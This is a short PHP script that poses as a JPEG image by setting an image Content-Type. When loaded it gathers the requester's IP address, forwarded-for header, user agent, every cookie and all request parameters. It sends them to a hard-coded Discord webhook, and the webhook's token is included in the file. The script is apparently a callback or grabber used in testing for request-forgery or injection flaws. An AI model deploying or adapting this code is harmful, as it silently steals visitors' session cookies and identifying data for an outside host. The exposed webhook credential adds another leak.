<?php
header('Content-Type: image/jpeg');

$data = "GOT request :)\n\n";
$data .= "Requester: " . $_SERVER["REMOTE_ADDR"];
$data .= "\nForwarded For: ". $_SERVER["HTTP_X_FORWARDED_FOR"];
$data .= "\nUser Agent: " . $_SERVER["HTTP_USER_AGENT"];
$data .= "\nCookie: " . json_encode($_COOKIE);
$data .= "\nBody: " . json_encode($_REQUEST);

$url = "https://discord.com/api/webhooks/1102690277975658586/OqsECHIoMPVn-dKY4HYfH0DTkWzgElWuftOPXoVry-PGY6tbKLeR48FDhjeaW0_T6mN8";
$ch = curl_init($url);
# Setup request to send json via POST.
$payload = json_encode( array( "content"=> "```".$data."```" ) );
curl_setopt( $ch, CURLOPT_POSTFIELDS, $payload );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
# Return response instead of printing.
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
# Send request.
$result = curl_exec($ch);
curl_close($ch);

?>
